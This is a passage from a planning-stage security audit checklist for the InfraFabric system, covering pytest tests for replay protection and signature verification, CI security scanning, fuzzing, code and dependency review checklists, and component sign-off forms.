    with pytest.raises(ValueError, match="Missing nonce"):
        IFConnectEnvelope.validate(message)

def test_message_requires_ttl():
    """Test that messages without TTL are rejected"""

    message = {
        "id": "msg-001",
        "performative": "inform",
        "sender": "if://agent/test",
        "seq": 1,
        "nonce": "random-nonce",
        # Missing ttl_s!
    }

    with pytest.raises(ValueError, match="Missing TTL"):
        IFConnectEnvelope.validate(message)

def test_expired_message_rejected():
    """Test that messages past TTL are rejected"""

    message = {
        "id": "msg-001",
        "performative": "inform",
        "sender": "if://agent/test",
        "seq": 1,
        "nonce": "random-nonce",
        "issued_at": "2025-01-01T00:00:00Z",  # Old timestamp
        "ttl_s": 300,  # 5 minute TTL
    }

    # This message is expired
    with pytest.raises(ValueError, match="Message expired"):
        IFConnectEnvelope.validate(message)

def test_replayed_message_rejected():
    """Test that replayed messages are detected"""

    from infrafabric.connect import MessageValidator

    validator = MessageValidator()

    message = {
        "id": "msg-001",
        "performative": "inform",
        "sender": "if://agent/test",
        "seq": 1,
        "nonce": "unique-nonce-12345",
        "issued_at": time.strftime("%Y-%m-%dT%H:%M:%SZ"),
        "ttl_s": 300,
    }

    # First delivery should succeed
    validator.validate(message)

    # Replay should be rejected (same nonce)
    with pytest.raises(ValueError, match="Duplicate nonce"):
        validator.validate(message)

def test_out_of_order_sequence_rejected():
    """Test that out-of-order messages are rejected"""

    from infrafabric.connect import MessageValidator

    validator = MessageValidator()

    # Send message with seq=5
    message1 = create_valid_message(sender="agent-1", seq=5)
    validator.validate(message1)

    # Try to send message with seq=3 (out of order)
    message2 = create_valid_message(sender="agent-1", seq=3)

    with pytest.raises(ValueError, match="Sequence number must be monotonic"):
        validator.validate(message2)
```

#### Manual Verification
- [ ] IF.connect v2.1 envelope implemented
- [ ] Nonce deduplication window configured (5 minutes)
- [ ] Sequence number tracking per sender
- [ ] TTL validation enforced
- [ ] Replay attack testing performed (external audit)

#### Acceptance Criteria
- ✅ All messages require seq, nonce, ttl
- ✅ Expired messages rejected (TTL exceeded)
- ✅ Replayed messages detected (duplicate nonce)
- ✅ Out-of-order messages rejected (non-monotonic seq)
- ✅ Replay attack testing passed (external audit)

---

### 5.3 Signature Verification

**Requirement:** All critical operations require signature verification

#### Automated Tests
```python
# tests/security/test_signature_verification.py

import pytest
from cryptography.hazmat.primitives.asymmetric import ed25519
from infrafabric.connect import IFConnectEnvelope
from infrafabric.crypto import sign_message, verify_message_signature

def test_unsigned_message_rejected():
    """Test that messages without signatures are rejected"""

    message = {
        "id": "msg-001",
        "performative": "inform",
        "sender": "if://agent/test",
        "seq": 1,
        "nonce": "nonce-123",
        "issued_at": "2025-11-12T10:00:00Z",
        "ttl_s": 300,
        "content": {"data": "test"},
        # Missing signature!
    }

    with pytest.raises(ValueError, match="Missing signature"):
        IFConnectEnvelope.validate(message, require_signature=True)

def test_invalid_signature_rejected():
    """Test that messages with invalid signatures are rejected"""

    # Create valid message
    private_key = ed25519.Ed25519PrivateKey.generate()
    public_key = private_key.public_key()

    message = {
        "id": "msg-001",
        "performative": "inform",
        "sender": "if://agent/test",
        "seq": 1,
        "nonce": "nonce-123",
        "issued_at": "2025-11-12T10:00:00Z",
        "ttl_s": 300,
        "content": {"data": "test"},
    }

    # Sign message
    signed_message = sign_message(message, private_key)

    # Tamper with message
    signed_message["content"]["data"] = "tampered"

    # Verification should fail
    with pytest.raises(ValueError, match="Invalid signature"):
        verify_message_signature(signed_message, public_key)

def test_signature_from_unknown_key_rejected():
    """Test that messages signed by unknown keys are rejected"""

    # Generate new key (not in trust registry)
    untrusted_key = ed25519.Ed25519PrivateKey.generate()

    message = create_valid_message()
    signed_message = sign_message(message, untrusted_key)

    # Should reject (key not in trust registry)
    with pytest.raises(ValueError, match="Untrusted public key"):
        IFConnectEnvelope.validate(signed_message, trust_registry=known_keys)

def test_capability_manifest_signature_verification():
    """Test that capability manifests require valid signatures"""

    from infrafabric.governor import verify_capability_signature

    manifest = {
        "id": "if://capability/vmix.switcher",
        "version": "1.0.0",
        "entrypoint": "providers/vmix/adapter.py:VmixAdapter",
        "signature": {
            "algorithm": "ed25519",
            "pubkey": "FAKE_KEY",
            "sig": "FAKE_SIGNATURE"
        }
    }

    with pytest.raises(ValueError, match="Invalid signature"):
        verify_capability_signature(manifest)
```

#### Manual Verification
- [ ] Trust registry implemented (known public keys)
- [ ] Public key rotation process documented
- [ ] Signature verification on all critical operations
- [ ] IF.witness operations signed by coordinator
- [ ] Capability manifests all signed
- [ ] Agent identity mapping (sender → public key)

#### Acceptance Criteria
- ✅ All messages signed by sender
- ✅ Invalid signatures rejected
- ✅ Unknown public keys rejected (trust registry)
- ✅ Capability manifests require valid signatures
- ✅ IF.witness operations cryptographically verifiable
- ✅ Public key rotation tested

---

## 6. Automated Security Testing

### 6.1 Security Test Suite

**Requirement:** Comprehensive automated security testing

#### Test Commands
```bash
# Run full security test suite
pytest tests/security/ \
  --cov=infrafabric \
  --cov-report=html \
  --cov-fail-under=80

# Run specific security test categories
pytest tests/security/test_coordinator_atomicity.py -v
pytest tests/security/test_governor_capability_validation.py -v
pytest tests/security/test_chassis_sandboxing.py -v
pytest tests/security/test_replay_protection.py -v
pytest tests/security/test_signature_verification.py -v

# Run injection attack tests
pytest tests/security/test_input_validation.py -v

# Run credential security tests
pytest tests/security/test_credentials.py -v

# Generate security report
pytest tests/security/ --html=security-report.html --self-contained-html
```

#### Continuous Integration
```yaml
# .github/workflows/security-tests.yml
name: Security Tests

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Run security test suite
        run: |
          pytest tests/security/ --junit-xml=security-results.xml

      - name: Check for vulnerabilities (Bandit)
        run: |
          bandit -r infrafabric/ -f json -o bandit-report.json

      - name: Dependency vulnerability scan (Safety)
        run: |
          safety check --json

      - name: SAST (Semgrep)
        run: |
          semgrep --config=auto --json -o semgrep-report.json

      - name: Fail on critical findings
        run: |
          python scripts/check_security_findings.py \
            --bandit bandit-report.json \
            --safety safety-report.json \
            --semgrep semgrep-report.json \
            --fail-on critical
```

#### Acceptance Criteria
- ✅ All security tests pass (0 failures)
- ✅ Test coverage ≥ 80% for security-critical code
- ✅ CI runs security tests on every commit
- ✅ Critical findings block merge
- ✅ Security report generated and archived

---

### 6.2 Vulnerability Scanning

**Requirement:** Regular vulnerability scanning of dependencies and code

#### Automated Scans
```bash
# Dependency vulnerability scanning (daily)
safety check --full-report

# Static analysis (every commit)
bandit -r infrafabric/ -ll -f json

# SAST scanning (every commit)
semgrep --config=auto infrafabric/

# Container image scanning (if using Docker)
trivy image infrafabric:latest --severity HIGH,CRITICAL

# Secrets scanning (every commit)
gitleaks detect --source . --verbose

# Supply chain security (weekly)
pip-audit --format json
```

#### Acceptance Criteria
- ✅ Zero high/critical vulnerabilities in dependencies
- ✅ Zero secrets detected in repository
- ✅ SAST findings reviewed and addressed
- ✅ Container images scanned before deployment
- ✅ Vulnerability scanning automated in CI

---

### 6.3 Fuzzing & Penetration Testing

**Requirement:** Adversarial testing to find edge cases

#### Fuzzing Tests
```bash
# Fuzz CLI input parsing
python3 scripts/fuzz_cli.py --iterations 1000000 --seed 42

# Fuzz IF.connect envelope parsing
python3 scripts/fuzz_envelope.py --iterations 1000000

# Fuzz capability manifest parsing
python3 scripts/fuzz_capability_manifest.py --iterations 1000000

# Fuzz WASM module loading
python3 scripts/fuzz_wasm_loader.py --iterations 100000
```

#### Penetration Testing Checklist
- [ ] External security firm engaged (annual)
- [ ] Penetration test scope includes:
  - [ ] IF.coordinator access control
  - [ ] IF.governor capability bypass attempts
  - [ ] IF.chassis sandbox escape attempts
  - [ ] CLI injection attacks
  - [ ] Replay attacks on IF.connect
  - [ ] Credential theft attempts
- [ ] Findings documented and addressed
- [ ] Re-test after remediation

#### Acceptance Criteria
- ✅ Fuzzing: 1M iterations, zero crashes
- ✅ External penetration test passed
- ✅ All critical findings remediated
- ✅ Re-test confirms fixes
- ✅ Penetration test report archived

---

## 7. Manual Security Review Requirements

### 7.1 Code Review Checklist

**Requirement:** Security-focused code review for all changes

#### Review Checklist
For every pull request, reviewer must verify:

**Authentication & Authorization**
- [ ] All endpoints require authentication
- [ ] RBAC enforced for sensitive operations
- [ ] Token expiration checked
- [ ] No hardcoded credentials

**Input Validation**
- [ ] All user input validated
- [ ] Whitelist validation (not blacklist)
- [ ] Length limits enforced
- [ ] Special characters sanitized

**Cryptography**
- [ ] Approved algorithms only (ed25519, SHA-256+, TLS 1.3)
- [ ] No hardcoded keys/IVs
- [ ] Cryptographically secure RNG used
- [ ] Signatures verified

**Error Handling**
- [ ] Errors don't leak sensitive information
- [ ] Generic error messages to users
- [ ] Detailed errors logged securely
- [ ] No stack traces to untrusted clients

**Data Protection**
- [ ] Secrets stored in Vault (not code)
- [ ] Credentials are temporary and scoped
- [ ] Sensitive data redacted in logs
- [ ] PII handling compliant with policy

**IF.witness Logging**
- [ ] All security events logged
- [ ] Logs tamper-evident
- [ ] Logs include context (who, what, when, why)
- [ ] Logs don't contain secrets

#### Acceptance Criteria
- ✅ 100% of PRs reviewed for security
- ✅ Security checklist completed for each PR
- ✅ At least 2 reviewers for security-critical code
- ✅ Security findings block merge
- ✅ Review comments documented in IF.witness

---

### 7.2 Architecture Review

**Requirement:** Security architecture review for major changes

#### Review Triggers
Architecture review required when:
- [ ] New component added (e.g., IF.coordinator, IF.governor, IF.chassis)
- [ ] Authentication/authorization changes
- [ ] Cryptography changes
- [ ] New external integration
- [ ] Privilege model changes
- [ ] Data flow changes

#### Review Checklist
- [ ] Threat model updated (STRIDE analysis)
- [ ] Trust boundaries identified
- [ ] Attack surface documented
- [ ] Security controls mapped to threats
- [ ] Defense in depth applied
- [ ] Principle of least privilege enforced
- [ ] Fail-secure by default

#### Acceptance Criteria
- ✅ Threat model documented and approved
- ✅ Security architect sign-off
- ✅ Architecture decision record (ADR) created
- ✅ Security controls tested
- ✅ Documentation updated

---

### 7.3 Dependency Review

**Requirement:** Security review of all dependencies

#### Review Process
For each new dependency:
- [ ] Purpose and alternatives evaluated
- [ ] Maintainer reputation checked
- [ ] Recent commits and activity verified
- [ ] Known vulnerabilities checked (CVE database)
- [ ] License compatibility verified
- [ ] Supply chain security assessed (typosquatting, etc.)
- [ ] Pinned to specific version (not `latest`)

#### Automated Checks
```bash
# Check dependency licenses
pip-licenses --format=json --output-file=licenses.json

# Check for known vulnerabilities
safety check --full-report

# Check for supply chain attacks
pip-audit --format json

# Verify package signatures (if available)
python3 scripts/verify_package_signatures.py
```

#### Acceptance Criteria
- ✅ All dependencies reviewed and approved
- ✅ Zero high/critical vulnerabilities
- ✅ Licenses compatible with project
- ✅ Dependencies pinned to specific versions
- ✅ Supply chain security verified

---

## 8. Sign-Off Process

### 8.1 Component Sign-Off

**Requirement:** Each component must pass security checklist before production

#### IF.coordinator Sign-Off
- [ ] etcd/NATS TLS enforced
- [ ] Authentication required
- [ ] Atomic CAS operations verified
- [ ] Access control tested
- [ ] Security tests passing (100%)
- [ ] External security review completed

**Sign-off:** _______________ Date: ___________

#### IF.governor Sign-Off
- [ ] Capability manifests signed
- [ ] Budget enforcement tested
- [ ] Capability matching verified
- [ ] Circuit breakers tested
- [ ] Security tests passing (100%)
- [ ] External security review completed

**Sign-off:** _______________ Date: ___________

#### IF.chassis Sign-Off
- [ ] WASM sandboxing verified
- [ ] Resource limits enforced
- [ ] Credential scoping tested
- [ ] Noisy neighbor prevention verified
- [ ] Security tests passing (100%)
- [ ] External security review completed

**Sign-off:** _______________ Date: ___________

#### CLI Sign-Off
- [ ] Input validation tested
- [ ] Credential storage secure
- [ ] Authentication/authorization enforced
- [ ] Injection attacks prevented
- [ ] Security tests passing (100%)
- [ ] External security review completed

**Sign-off:** _______________ Date: ___________

---

### 8.2 Integration Sign-Off

**Requirement:** End-to-end security testing of integrated system

#### Integration Tests Completed
- [ ] IF.coordinator + IF.governor integration
- [ ] IF.governor + IF.chassis integration
- [ ] CLI + all components integration
- [ ] IF.witness logging end-to-end
- [ ] Replay attack prevention tested
- [ ] Signature verification end-to-end

#### Load & Stress Testing
- [ ] 100 concurrent swarms (no race conditions)
- [ ] Noisy neighbor scenario (99 swarms unaffected)
- [ ] Budget exhaustion scenario (circuit breaker trips)
- [ ] Credential expiration scenario (access denied)
- [ ] Network partition scenario (graceful degradation)

#### Security Testing
- [ ] Penetration testing completed
- [ ] Fuzzing testing completed (1M+ iterations)
- [ ] Vulnerability scanning completed (zero critical)
- [ ] All findings remediated
- [ ] Re-testing confirms fixes

**Sign-off:** _______________ Date: ___________

---

### 8.3 Production Readiness Sign-Off

**Requirement:** Final approval before production deployment

#### Checklist
- [ ] All component sign-offs complete
- [ ] Integration sign-off complete
- [ ] External security audit passed
- [ ] Incident response plan documented
- [ ] Security monitoring configured (alerts)
- [ ] Backup and recovery tested
- [ ] Disaster recovery plan documented
- [ ] Security training completed (team)
- [ ] Documentation complete (runbooks, playbooks)
- [ ] Rollback plan tested

#### Approvals Required
- [ ] Security Architect: _______________ Date: ___________
- [ ] Engineering Lead: _______________ Date: ___________
- [ ] Product Owner: _______________ Date: ___________

#### Production Deployment
- [ ] Deployed to staging (1 week minimum)
- [ ] Monitoring verified (no alerts)
- [ ] Performance acceptable (SLOs met)
- [ ] Security scan passed (production environment)
- [ ] Final approval: _______________ Date: ___________

---

## Summary

This security audit checklist ensures all Phase 0 components meet production security requirements. Key achievements when complete:

✅ **IF.coordinator:** Secure, atomic coordination with TLS and authentication
✅ **IF.governor:** Signed capabilities, budget enforcement, circuit breakers
✅ **IF.chassis:** WASM sandboxing, resource isolation, scoped credentials
✅ **CLI:** Input validation, secure credential storage, authentication
✅ **Cross-cutting:** Modern crypto, replay protection, signature verification
✅ **Testing:** 80%+ coverage, automated scans, fuzzing, penetration testing
✅ **Process:** Code review, architecture review, dependency review
✅ **Sign-off:** Component, integration, and production readiness approvals

**Estimated Timeline:**
- Security implementation: 24-30h (included in Phase 0)
- Security testing: 8-10h
- External security audit: 2-3 days (external firm)
- Total: ~40-50h + external audit

**Estimated Cost:**
- Internal effort: $600-750 (40-50h @ $15/h)
- External security audit: $3,000-5,000
- Total: $3,600-5,750

**ROI:** $2,000-5,000 risk avoided (from S2-CRITICAL-BUGS-AND-FIXES.md)

---

**Document Status:** Planning
**Next Steps:** Begin Phase 0 implementation with security controls built-in
**Review Schedule:** Update this checklist as components are implemented
**Audit Schedule:** External security audit after Phase 0 complete

**Prepared by:** Security Planning (based on IF-TECHNICAL-REVIEW.md)
**Date:** 2025-11-12
**Branch:** claude/debug-session-freezing-011CV2mM1FVCwsC8GoBR2aQy
